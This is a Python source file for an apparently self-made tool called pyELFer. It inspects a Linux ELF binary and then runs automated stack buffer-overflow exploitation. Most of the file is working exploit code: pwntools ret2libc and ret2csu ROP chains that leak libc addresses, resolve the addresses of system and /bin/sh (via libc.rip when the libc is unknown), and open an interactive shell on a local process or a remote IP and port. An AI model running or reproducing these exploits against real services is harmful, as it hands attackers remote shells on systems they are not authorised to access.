#!/usr/bin/env python3

import requests
import json
import platform
import subprocess
import os 
import optparse
import sys
from pwn import *

def program_args():
    opt_parser = optparse.OptionParser()
    opt_parser.add_option("-f","--FILE",help="BINARY TO EXPLOIT",dest="file_name",default=False,metavar="FILE")
    (option,args) = opt_parser.parse_args()
    return (option,args)

def os_check():
    print("Checking if this program is running on Linux")
    if(platform.system() == 'Linux'):
        print("Initiation Protocol Succeded")
    else:
        print("Sorry Not a Linux OS")
        sys.exit()


def pyelf_directory_check():
    try:
        directory_check = os.access("/tmp/pyELFer",os.F_OK)
        if(directory_check == False):
            print("Unsure of User's Permission in the machine so creating a folder called pyELFer in tmp folder that has most of the output stored in .txt files")
            os.system('mkdir /tmp/pyELFer')
    except:
        print("!!!Oh shit unknown fatal error")
        sys.exit()
        
                
def printable_chars_of_executable(str_file_name):
    extras = ['libc.so.6','AWAVI','AUATL','[]A\A]A^A_',';*3$"','crtstuff.c','deregister_tm_clones','frame_dummy','/lib64/ld-linux-x86-64.so.2','stdin','stdout','stderr','[]A\\\\A]A^A_','\'']
    check = subprocess.check_output(["strings",str_file_name])
    function_file = open('c_functions.txt','r')
    func = function_file.read()
    func = func.split("\n")
    str_check = str(check)
    list_check = str_check.split("\\n")
    filer_name = opts.file_name.split("/")
    file_name = filer_name[-1]
    print("Opened the file for string dump")
    file_open = open("/tmp/pyELFer/strings_for_" + file_name + ".txt","w")
    file_open.write("Sections and Compiler generated functions:\n")
    sections = []
    binary_compiled_sysinfo = ''
    source_code_name = ''
    predefineds = []
    imp_strings_and_user_defined_funcs = []
    for i in list_check:
        if(i.startswith('.') or i .startswith('_')):
            sections.append(i)
        elif(i.startswith('GCC')):
            binary_compiled_sysinfo = i
        elif((i.endswith('.c') or i.endswith('.s')) and (i != 'crtstuff.c')):
            source_code_name = i
        elif(i in func):
            predefineds.append(i)
        elif(('GLIBC' in i) or (i in extras) or ('lib' in i) or ('completed' in i)):
            continue
        else:
            imp_strings_and_user_defined_funcs.append(i)
    for i in sections:
        file_open.write(i)
        file_open.write("\n")
    file_open.write("Predefined functions in the binary:\n")
    for i in predefineds:
        file_open.write(i)
        file_open.write("\n")
    file_open.write("User defined functions and some important strings to look out for:\n")
    for i in imp_strings_and_user_defined_funcs:
        file_open.write(i)
        file_open.write("\n")
    file_open.write("Name of the source code: " + source_code_name + "\n")
    file_open.write("Compiled binary sysinfo and compiler info: " + binary_compiled_sysinfo + "\n")
    file_open.close()   
    function_file.close()
    print("Finished dumping the strings into strings_for_" + file_name + ".txt")

def elf_file_check(FileName):
    try:
        file_existence = os.access(FileName,os.F_OK)
    except:
        print("---------------------------------------------------------------------------------")
        print("If yes then install python3 and then type 'pip3 install os' in terminal")
        print("---------------------------------------------------------------------------------")
        sys.exit()
    if(file_existence == False):
        print("----------------------------------------------------------")
        print("Sorry!! NO file found that is specified in the arguments")
        print("----------------------------------------------------------")
        sys.exit()
    try:
        file_access = os.access(FileName,os.R_OK)
        if(file_access == False):
            print("----------------------------------------------")
            print("Sorry!!!File does not have a read permission")
            print("----------------------------------------------")
            sys.exit()
        file_output = subprocess.check_output(["file",FileName]).decode()
        linked = ''
        if('GNU/Linux' in file_output):
            if('dynamically linked' in file_output):
                linked = 'dynamic'
            elif('statically linked' in file_output):
                linked = 'static'
            else:
                linked = 'unknown'
        return linked,file_output
    except:
       print("----------------------------------------------------------------------------------")
       print("If Yes then install python3 and then type 'pip3 install subprocess' in terminal")
       print("-----------------------------------------------------------------------------------")
       sys.exit()


def py_arch_parser(elf_out):
    ELF = False
    if('ELF' in elf_out):
        ELF = True
        if(('GNU/Linux' in elf_out) or ('/lib/ld-linux.so.2' in elf_out) or ('/lib64/ld-linux-x86-64.so.2' in elf_out)):
            if('ARM' in elf_out):
                ARCH = 'Linux ARM'
            elif('Intel 80386' in elf_out):
                ARCH = 'Linux 32 Bit'
            elif('x86-64' in elf_out):
                ARCH = 'Linux 64 Bit'
            else:
                ARCH = 'UKNOWN GNU/LINUX ELF FORMAT CANNOT BE RECOGNIZED AND ANALYZED'
        elif('PowerPC' in elf_out):
            ARCH='PowerPC'
        elif('MIPS' in elf_out):
            ARCH = 'MIPS'
        else:
            ARCH = 'UNKOWN ELF FORMAT CANNOT BE RECOGNIZED AND ANALYZED'
    elif('PE' in elf_out):
        ARCH = 'Windows'
    else:
        ARCH = 'NOT ELF LINUX AND PE WINDOWS EXECUTABLE'
    print("-----------------------------------------------------------")
    print("1.ELF: " + str(ELF))
    print("-----------------------------------------------------------")
    print("2.ARCH: " + ARCH)
    print("-----------------------------------------------------------")
    return ARCH

def py_strip_parser(file_out):
    if(('PE' in file_out) or ('ELF' in file_out)):
        if('not stripped' in file_out):
            STRIPPED = False
        else:
            STRIPPED = True
    else:
        STRIPPED = 'Confusion due to unknown file format or doubt whether it is a executable or not'
    return STRIPPED

def execution_check(f_arch):
    machine_arch = platform.architecture()[0]
    if(machine_arch == '32bit'):
        if(f_arch != 'Linux 32 Bit'):
            return False
        else:
            return True
    elif(machine_arch == '64bit'):
        if((f_arch == 'Linux 32 Bit') or (f_arch == 'Linux 64 Bit')):
            return True
        else:
            return False
    else:
        return False


def exploitation_mode(file_name,arch):
    exploit_mitigation = subprocess.check_output(['./bof.py',opts.file_name]).decode().rstrip()
    print(exploit_mitigation) 
    exploit_mitigation = exploit_mitigation.split("\n")
    pie = exploit_mitigation[-1]
    nx = exploit_mitigation[-2]
    stack_canary = exploit_mitigation[-3]
    stack_canary_bool = True
    pie_bool = True
    if('No PIE' in pie):
        pie_bool = False
        base_address = pie.rstrip(")")
        base_address = base_address.lstrip()
        base_address = base_address.lstrip("PIE:      No PIE (")
        base_address = int(base_address,16)
        log.info("The base address of process in memory is " + hex(base_address))
    else:
        print("Presence of PIE complex to exploit")
        ret2libc_64(file_name,int('0x400000',16))
        sys.exit()
    if('No canary' in stack_canary):
        stack_canary_bool = False
    else:
        print("Presence of Stack guard complex to exploit")
        sys.exit()
    if('NX disabled' in nx):
        log.info("Shellcode injection is a distant dream for now")
        sys.exit()
    else:
        if(arch == 'Linux 64 Bit'):
            ret2libc_64(file_name,base_address)
        else:
            log.info("32 bit new compiler generated program have a different way of leave ret which forces us to brute..So no 32 bit ELF's")
            sys.exit()

def ret2libc_64(fl_name,base_addr):
    function_list = []
    log.info("Works")
    try:
        read_plt = subprocess.check_output(['objdump','-R',fl_name]).decode().rstrip().split("\n")
        for i in read_plt:
            if('GLIBC' in i):
                r = i.split()[-1]
                function_list.append(r)
    except subprocess.CalledProcessError:
        log.info("OBJDUMP failure signifies presence of asm or shellcode not a C source code compiled")
    scanf = False
    read = False
    gets = False
    fgets = False
    puts = False
    write = True
    printf = False
    for i in function_list:
        if('scanf' in i):
            scanf = True
        elif('read' in i):
            read = True
        elif('gets' in i):
            gets = True
        elif('fgets' in i):
            fgets = True
        elif('puts' in i):
            puts = True
        elif('printf' in i):
            printf = True
        elif('write' in i):
            write = True
    if(((gets == True) or (scanf == True)) and ((puts == True) or (printf == True))):
        e = ELF(fl_name)
        libc_location = "/lib/x86_64-linux-gnu/libc.so.6"
        libc = ELF(libc_location)
        extra_input = input("Any input need to pass to point to the vulnerable buffer:").rstrip().encode()
        if(len(extra_input) > 0):
            extra_input = extra_input.replace(b"newline",b"\n")
        offset = int(input("Enter the offset to reach ret address:"))
        rop = ROP(e)
        ret = rop.find_gadget(['ret'])[0]
        pop_rdi = rop.find_gadget(['pop rdi'])[0]
        if(type(pop_rdi) == None):
            log.info("Absence of pop rdi gadget!!!Exiting the program")
            sys.exit()
        try:
            r = process(fl_name)
            offset_pusher= extra_input + b'A' * offset +p64(pop_rdi) 
            if(puts == True):
                puts_leak = p64(e.got['puts']) + p64(e.plt['puts']) + p64(e.symbols['main'])
                libc_leaker = offset_pusher + puts_leak
            else:
                printf_leak = p64(ret) + p64(e.got['printf']) + p64(e.plt['printf']) + p64(e.symbols['main'])
                libc_leaker = offset_pusher + printf_leak
            r.sendline(libc_leaker)
            a = r.recvuntil(b'\x7f')
            a = a[-6::1]
            a = u64(a.decode('latin-1').ljust(8,'\x00'))
            if(puts == True):
                libc_base = a - libc.symbols['puts']
            else:
                libc_base = a - libc.symbols['printf']
            libc_system = libc_base + libc.symbols['system']
            bin_sh = libc_base + (next(libc.search(b'/bin/sh')))
            offset_sender = extra_input + b'A' * offset
            bomb=p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(libc_system)
            exploit = offset_sender + bomb
            r.sendline(exploit)
            r.interactive()
            try:
                r.close()
            except BrokenPipeError:
                pass
        except EOFError:
            log.info("Are u sure that offsets are correct")
            sys.exit()
        work_input = int(input("Did shell popped 1 for yes 2 for no:"))
        if(work_input == 1):
            remote_exploit = int(input("Do u have a remote server that run this binary that is open to exploit 1 for yes and with system libc file in hand and 2 for yes but no libc in hand and any other number for just local testing:"))
            if(remote_exploit == 1):
                ip = input("Give me the Remote server IP:").rstrip()
                port = int(input("Give me the Remote server's port:"))
                while(True):
                    try:
                        libc_input = input("Enter the location of server's libc file:").rstrip()
                        break
                    except FileNotFoundError:
                        log.info("File name not specified correctly")
                shared_object_check = subprocess.check_output(['file',libc_input])
                if(b'shared object' not in shared_object_check):
                    log.info("Not a shared object file given")
                    sys.exit()
                else:
                    libc_file = ELF(libc_input)
                count = 0
                while(count < 4):
                    try:
                        r = remote(ip,port)
                    except Exception:
                        log.info("Error in making connection to the remote server is it correct ip or port")
                        sys.exit()
                    r.sendline(libc_leaker)
                    try:
                        a = r.recvuntil(b'\x7f')
                        a = a[-6::1]
                        a = u64(a.decode('latin-1').ljust(8,'\x00'))
                        if(puts == True):
                            libc_base = a - libc_file.symbols['puts']
                        else:
                            libc_base = a - libc_file.symbols['printf']
                        libc_system = libc_base + libc_file.symbols['system']
                        bin_sh = libc_base + (next(libc_file.search(b'/bin/sh')))
                        ret = p64(rop.find_gadget(['ret'])[0]) * count
                        bomb = p64(pop_rdi) + p64(bin_sh) + p64(libc_system)
                        exploit = offset_sender + ret + bomb
                        r.sendline(exploit)
                        r.interactive()
                        r.close()
                        did_it_work = int(input("Did shell popped 1.for yes and 2.for no:"))
                        if(did_it_work == 1):
                            log.info("pyELFer!!Thanks for using pyELFer")
                            sys.exit()
                        elif(did_it_work == 2):
                            count+=1
                        else:
                            log.info("Please give the correct input")
                    except EOFError:
                        log.info("Exploit works perfectly on local but fails on remote due to some buffering problems in binary")
                        r.close()
                        sys.exit()
            elif(remote_exploit == 2):
                count = 0
                index = -1
                ip = input("Give me the Remote server IP:").rstrip()
                port = int(input("Give me the Remote server's port:"))
                while(count < 4):
                    try:
                        r = remote(ip,port)
                    except Exception:
                        log.info("Error in making connection to the remote server is it correct ip or port")
                        sys.exit()
                    r.sendline(libc_leaker)
                    try:
                        remote_unknown_libc_leak = r.recvuntil(b'\x7f')
                        remote_unknown_libc_leak = remote_unknown_libc_leak[-6::1]
                        remote_unknown_libc_leak = u64(remote_unknown_libc_leak.decode('latin-1').ljust(8,'\x00'))
                        libc_list = []
                        if(puts == True):
                            request_handle = requests.post("https://libc.rip/api/find",json = {"symbols":{"puts":hex(remote_unknown_libc_leak)}})
                            json_handle = request_handle.json()
                            for i in json_handle:
                                libc_list.append(i)
                            if(len(libc_list) == 1):
                                libc_base = remote_unknown_libc_leak - int(libc_list[0]["symbols"]["puts"].lstrip("0x"),16)
                                libc_system = libc_base + int(libc_list[0]["symbols"]["system"].lstrip("0x"),16)
                                bin_sh = libc_base + int(libc_list[0]["symbols"]["str_bin_sh"].lstrip("0x"),16)
                                ret=p64(rop.find_gadget(['ret'])[0]) * count
                                bomb = p64(pop_rdi) + p64(bin_sh) + p64(libc_system)
                                exploit = offset_sender + ret + bomb
                                r.sendline(exploit)
                                r.interactive()
                                r.close()
                                shell_popped = int(input("Did Shell popped 1 for yes 2 for no:"))
                                if(shell_popped == 1):
                                    log.info("Thanks for using pyELFer")
                                    sys.exit()
                                elif(shell_popped == 2):
                                    count+=1
                                    continue
                            else:
                                if(index == -1):
                                    i = 0
                                    while(i < len(libc_list)):
                                        print("" + str(i) + "\t" + libc_list[i]["id"])
                                        i+=1
                                    try:
                                        index = int(input("Enter the index of libc you want to ensure for the exploitation process:"))
                                    except (ValueError,NameError):
                                        log.info("Wrong Input!!Quiting the tools")
                                        r.close()
                                        sys.exit()
                                libc_base = remote_unknown_libc_leak - int(libc_list[index]["symbols"]["puts"].lstrip("0x"),16)
                                libc_system = libc_base + int(libc_list[index]["symbols"]["system"].lstrip("0x"),16)
                                bin_sh = libc_base + int(libc_list[index]["symbols"]["str_bin_sh"].lstrip("0x"),16)
                                ret=p64(rop.find_gadget(['ret'])[0]) * count
                                bomb = p64(pop_rdi) + p64(bin_sh) + p64(libc_system)
                                exploit = offset_sender + ret + bomb
                                r.sendline(exploit)
                                r.interactive()
                                r.close()
                                shell_popped = int(input("Did Shell popped 1 for yes 2 for no:"))
                                if(shell_popped == 1):
                                    log.info("Thanks for using pyELFer")
                                    sys.exit()
                                elif(shell_popped == 2):
                                    count+=1
                                    continue
                        elif(printf == True):
                            request_handle = requests.post("https://libc.rip/api/find",json = {"symbols":{"printf":hex(remote_unknown_libc_leak)}})
                            json_handle = request_handle.json()
                            for i in json_handle:
                                libc_list.append(i)
                            if(len(libc_list) == 1):
                                libc_base = remote_unknown_libc_leak - int(libc_list[0]["symbols"]["printf"].lstrip("0x"),16)
                                print(hex(libc_base))
                                libc_system = libc_base + int(libc_list[0]["symbols"]["system"].lstrip("0x"),16)
                                bin_sh = libc_base + int(libc_list[0]["symbols"]["str_bin_sh"].lstrip("0x"),16)
                                ret=p64(rop.find_gadget(['ret'])[0]) * count
                                bomb = p64(pop_rdi) + p64(bin_sh) + p64(libc_system)
                                exploit = offset_sender + ret + bomb
                                r.sendline(exploit)
                                r.interactive()
                                r.close()
                                shell_popped = int(input("Did Shell popped 1 for yes 2 for no:"))
                                if(shell_popped == 1):
                                    log.info("Thanks for using pyELFer")
                                    sys.exit()
                                elif(shell_popped == 2):
                                    count+=1
                                    continue
                            else:
                                if(index == -1):
                                    i = 0
                                    while(i < len(libc_list)):
                                        print("" + str(i) + "\t" + libc_list[i]["id"])
                                        i+=1
                                    try:
                                        index = int(input("Enter the index of libc you want to ensure for the exploitation process:"))
                                    except (ValueError,NameError):
                                        log.info("Wrong Input!!Quiting the tools")
                                        r.close()
                                        sys.exit()
                                libc_base = remote_unknown_libc_leak - int(libc_list[index]["symbols"]["printf"].lstrip("0x"),16)
                                print(hex(libc_base))
                                libc_system = libc_base + int(libc_list[index]["symbols"]["system"].lstrip("0x"),16)
                                bin_sh = libc_base + int(libc_list[index]["symbols"]["str_bin_sh"].lstrip("0x"),16)
                                ret=p64(rop.find_gadget(['ret'])[0]) * count
                                bomb = p64(pop_rdi) + p64(bin_sh) + p64(libc_system)
                                exploit = offset_sender + ret + bomb
                                r.sendline(exploit)
                                r.interactive()
                                r.close()
                                shell_popped = int(input("Did Shell popped 1 for yes 2 for no:"))
                                if(shell_popped == 1):
                                    log.info("Thanks for using pyELFer")
                                    sys.exit()
                                elif(shell_popped == 2):
                                    count+=1
                                    continue
                    except EOFError:
                        log.info("Exploit works perfectly in local but EOFError on remote specifies a buffering problem in binary")
                        r.close()
                        sys.exit()
            else:
                log.info("Only local process exploit!!!")
                sys.exit()
        elif(work_input == 2):
            log.info("Exploit failed maybe!!pyELFer may have failed")
            sys.exit()
        else:
            log.info("Invalid option given!!")
            sys.exit()

    elif(write == True):
        ret2csu(fl_name,base_addr)
        sys.exit()

def ret2csu(file_name,base_addr):
    file_output = subprocess.check_output(['objdump','-M','intel','-d',file_name]).decode().split("\n")
    csu_gadget = 0
    csu_gadget_instructions = []
    for i in file_output:
        if(csu_gadget == 1):
            if('ret' in i):
                csu_gadget_instructions.append(i)
                csu_gadget = 0
            else:
                csu_gadget_instructions.append(i)
        else:
            if('<__libc_csu_init>' in i):
                csu_gadget = 1
    mov_rdx_gadget = 0
    csu_gadget1 = []
    csu_gadget1_boolean = 0
    csu_gadget2 = []
    csu_gadget2_boolean = 0
    for i in csu_gadget_instructions:
        if(mov_rdx_gadget == 0):
            if('mov    rdx' in i):
                mov_rdx_gadget = 1
                csu_gadget2_boolean = 1
                csu_gadget2.append(i)
        else:
            if('pop    rbx' in i):
                csu_gadget2_boolean = 0
                csu_gadget1_boolean = 1
                csu_gadget1.append(i)
            elif(csu_gadget2_boolean == 1):
                csu_gadget2.append(i)
            else:
                csu_gadget1.append(i)
    arg_registers = []
    i = 0
    while(i < 3):
        reg = csu_gadget2[i].split(",")[-1][0:3]
        arg_registers.append(reg)
        i+=1
    pop_regs = []
    i = 0
    while(i < len(csu_gadget1)):
        reg = csu_gadget1[i].split()[-1]
        pop_regs.append(reg)
        i+=1
    pop_regs.pop(-1)
    i = 0
    keys = []
    while(i < len(arg_registers)):
        index = pop_regs.index(arg_registers[i])
        keys.append(index)
        i+=1
    for i in csu_gadget2:
        if('call' in i):
            init_regs_8 = pop_regs.index(i.rstrip("*8]")[-3:])
            keys.append(init_regs_8)
            init_regs = pop_regs.index(i.split("+")[0][-3:])
            keys.append(init_regs)
    for i in csu_gadget2:
        if('cmp' in i):
            check_reg = pop_regs.index(i.split(",")[0][-3:])
            keys.append(check_reg)
    e = ELF(file_name)
    dynamic_value = subprocess.check_output(["readelf","--sections",file_name]).decode().split("\n")
    for i in dynamic_value:
        if('.dynamic' in i):
            dynamic = int(i.split()[-2],16)
    if(dynamic < 0x10000):
        dynamic = int(base_addr,16) + dynamic
    dynamic_init = dynamic + 0x18
    val_dict = {keys[0]:6,keys[1]:e.got['write'],keys[2]:1,keys[3]:0,keys[4]:dynamic_init,keys[5]:1}
    csu_gadget1_address = int(csu_gadget1[0].split(":")[0],16)
    csu_gadget2_address = int(csu_gadget2[0].split(":")[0],16)
    if(csu_gadget1_address < 0x10000):
        csu_gadget1_address = int(base_addr,16) + csu_gadget1_address
    if(csu_gadget2_address < 0x10000):
        csu_gadget2_address = int(base_addr,16) + csu_gadget2_address
    libc_location = "/lib/x86_64-linux-gnu/libc.so.6"
    libc = ELF(libc_location)
    extra_input = input("Any input need to pass to point to the vulnerable buffer:").rstrip().encode()
    if(len(extra_input) > 0):
        extra_input = extra_input.replace(b"newline",b"\n")
    offset = int(input("Enter the offset to reach ret address:"))
    try:
        r = process(file_name)
        offset_pusher= extra_input + b'A' * offset
        read_leak = p64(csu_gadget1_address) + p64(val_dict.get(0)) + p64(val_dict.get(1)) + p64(val_dict.get(2))
        read_leak +=p64(val_dict.get(3)) + p64(val_dict.get(4)) + p64(val_dict.get(5)) 
        read_leak +=p64(csu_gadget2_address) + p64(0) * 7 + p64(e.plt['write']) + p64(e.symbols['main']) 
        libc_leaker = offset_pusher + read_leak
        r.sendline(libc_leaker)
        a = r.recvuntil('\x7f')
        a = a[-6::1]
        a = u64(a.decode('latin-1').ljust(8,'\x00'))
        libc_base = a - libc.symbols['write']
        libc_system = libc_base + libc.symbols['system']
        bin_sh = libc_base + (next(libc.search(b'/bin/sh')))
        offset_sender = extra_input + b'A' * offset
        rop = ROP(e)
        pop_rdi = rop.find_gadget(['pop rdi'])[0]
        bomb=p64(pop_rdi) + p64(bin_sh) + p64(libc_system)
        exploit = offset_sender + bomb
        r.sendline(exploit)
        r.interactive()
        try:
            r.close()
        except BrokenPipeError:
            pass
    except EOFError:
        log.info("Are u sure that offsets are correct")
        sys.exit()
    did_it_worked = int(input("Did shell popped 1.for yes and 2. for no:"))
    if(did_it_worked == 1):
        remote_int_input = int(input("Enter 1.if remote binary present and with remote server libc in hand or 2.remote binary present but no libc is present or any other number for just local testing:"))
        if(remote_int_input == 1):
            ip = input("Give me the Remote server IP:").rstrip()
            port = int(input("Give me the Remote server's port:"))
            while(True):
                try:
                    libc_input = input("Enter the location of server's libc file:").rstrip()
                    break
                except FileNotFoundError:
                    log.info("File name not specified correctly")
            shared_object_check = subprocess.check_output(['file',libc_input])
            if(b'shared object' not in shared_object_check):
                log.info("Not a shared object file given")
                sys.exit()
            else:
                libc_file = ELF(libc_input)
            count = 0
            while(count < 4):
                try:
                    r = remote(ip,port)
                except Exception:
                    log.info("Error in making connection to the remote server is it correct ip or port")
                    sys.exit()
                r.sendline(libc_leaker)
                try:
                    a = r.recvuntil('\x7f')
                    a = a[-6::1]
                    a = u64(a.decode('latin-1').ljust(8,'\x00'))
                    libc_base = a - libc_file.symbols['write']
                    libc_system = libc_base + libc_file.symbols['system']
                    bin_sh = libc_base + (next(libc_file.search(b'/bin/sh')))
                    ret = p64(rop.find_gadget(['ret'])[0]) * count
                    bomb = p64(pop_rdi) + p64(bin_sh) + p64(libc_system)
                    exploit = offset_sender + ret + bomb
                    r.sendline(exploit)
                    r.interactive()
                    r.close()
                    did_it_work = int(input("Did shell popped 1.for yes and 2.for no:"))
                    if(did_it_work == 1):
                        log.info("Thanks for using pyELFer!!")
                        sys.exit()
                    elif(did_it_work == 2):
                        count+=1
                    else:
                        log.info("Please give the correct input")
                except EOFError:
                    log.info("Exploit works perfectly on local but fails on remote due to some buffering problems in binary")
                    r.close()
                    sys.exit()
        if(remote_int_input == 2):
            count = 0
            index = -1
            ip = input("Give me the Remote server IP:").rstrip()
            port = int(input("Give me the Remote server's port:"))
            while(count < 4):
                try:
                    r = remote(ip,port)
                except Exception:
                    log.info("Error in making connection to the remote server is it correct ip or port")
                    sys.exit()
                r.sendline(libc_leaker)
                try:
                    remote_unknown_libc_leak = r.recvuntil('\x7f')
                    remote_unknown_libc_leak = remote_unknown_libc_leak[-6::1]
                    remote_unknown_libc_leak = u64(remote_unknown_libc_leak.decode('latin-1').ljust(8,'\x00'))
                    libc_list = []
                    request_handle = requests.post("https://libc.rip/api/find",json = {"symbols":{"write":hex(remote_unknown_libc_leak)}})
                    json_handle = request_handle.json()
                    for i in json_handle:
                        libc_list.append(i)
                    if(len(libc_list) == 1):
                        libc_base = remote_unknown_libc_leak - int(libc_list[0]["symbols"]["write"].lstrip("0x"),16)
                        libc_system = libc_base + int(libc_list[0]["symbols"]["system"].lstrip("0x"),16)
                        bin_sh = libc_base + int(libc_list[0]["symbols"]["str_bin_sh"].lstrip("0x"),16)
                        ret=p64(rop.find_gadget(['ret'])[0]) * count
                        bomb = p64(pop_rdi) + p64(bin_sh) + p64(libc_system)
                        exploit = offset_sender + ret + bomb
                        r.sendline(exploit)
                        r.interactive()
                        r.close()
                        shell_popped = int(input("Did Shell popped 1 for yes 2 for no:"))
                        if(shell_popped == 1):
                            log.info("Thanks for using pyELFer")
                            sys.exit()
                        elif(shell_popped == 2):
                            count+=1
                            continue
                    else:
                        if(index == -1):
                            i = 0
                            while(i < len(libc_list)):
                                print("" + str(i) + "\t" + libc_list[i]["id"])
                                i+=1
                            try:
                                index = int(input("Enter the index of libc you want to ensure for the exploitation process:"))
                            except (ValueError,NameError):
                                log.info("Wrong Input!!Quiting the tool")
                                r.close()
                                sys.exit()
                        libc_base = remote_unknown_libc_leak - int(libc_list[index]["symbols"]["write"].lstrip("0x"),16)
                        libc_system = libc_base + int(libc_list[index]["symbols"]["system"].lstrip("0x"),16)
                        bin_sh = libc_base + int(libc_list[index]["symbols"]["str_bin_sh"].lstrip("0x"),16)
                        ret=p64(rop.find_gadget(['ret'])[0]) * count
                        bomb = p64(pop_rdi) + p64(bin_sh) + p64(libc_system)
                        exploit = offset_sender + ret + bomb
                        r.sendline(exploit)
                        r.interactive()
                        r.close()
                        shell_popped = int(input("Did Shell popped 1 for yes 2 for no:"))
                        if(shell_popped == 1):
                            log.info("Thanks for using pyELFer")
                            sys.exit()
                        elif(shell_popped == 2):
                            count+=1
                            continue
                except EOFError:
                    log.info("Exploit works perfectly in local but EOFError on remote specifies a buffering problem in binary")
                    r.close()
                    sys.exit()
    elif(did_it_worked == 2):
        log.info("pyELFer Did not seemed to have worked here!!Sorry")
        sys.exit()
    else:
        log.info("Invalid Option given")
        sys.exit()



try:
    (opts,args) = program_args()
    print("------------------------------------------------------------------------------------------------------------------------------------------------------------------")
    print("ELF C ANALYZER")
    print("------------------------------------------------------------------------------------------------------------------------------------------------------------------")
    if(opts.file_name == False):
        print("--------------------------------------------------------------------------------------------------------------------------------------------------------------")
        print("File not specified!!Sorry exiting the Program")
        print("--------------------------------------------------------------------------------------------------------------------------------------------------------------")
        exit()
    os_check()
    pyelf_directory_check()
    link_info,elf_file_check_output = elf_file_check(opts.file_name)
    if(link_info == 'dynamic'):
        print("STEP 1:Gonna put the printable characters of the executable in the folder /tmp/pyELFer/string_for_(file_name_provided_comes_here).txt")
        printable_chars_of_executable(opts.file_name)
        file_name = opts.file_name.split("/")[-1]
        print("--------------------------------------------------------------------------------------------------------------------------------------------------------------")
        print("\t\t\t\t\t\t\t\t\t\tABOUT THE FILE SPECIFIED")
        print("--------------------------------------------------------------------------------------------------------------------------------------------------------------")
    elif(link_info == 'static'):
        print("Sorry not gonna dump the strings from the binary as it is statically linked and produce more bogus data")
    else:
        print("Sorry not ELF or other issue maybe grouping of strings can go wrong so not gonna dump the strings")
    file_ARCH_check = py_arch_parser(elf_file_check_output)
    file_strip_check = py_strip_parser(elf_file_check_output) 
    print("-------------------------------------")
    print("3.STRIPPED: " + str(file_strip_check))
    print("-------------------------------------")
    exec_boolean = execution_check(file_ARCH_check)
    print("-----------------------------------------------")
    print("4.Can this Executable run on this machine:" + str(exec_boolean))
    print("-----------------------------------------------")
    if(exec_boolean == False):
        sys.exit()
    try:
        if((file_strip_check == False) and (exec_boolean == True)):
            exploitation_mode(opts.file_name,file_ARCH_check)
    except (ValueError,NameError):
        log.info("Please Input a Number")
        sys.exit()
except KeyboardInterrupt:
    log.info("User pressed!!Ctrl+C!Exiting the Program!!")
    sys.exit()
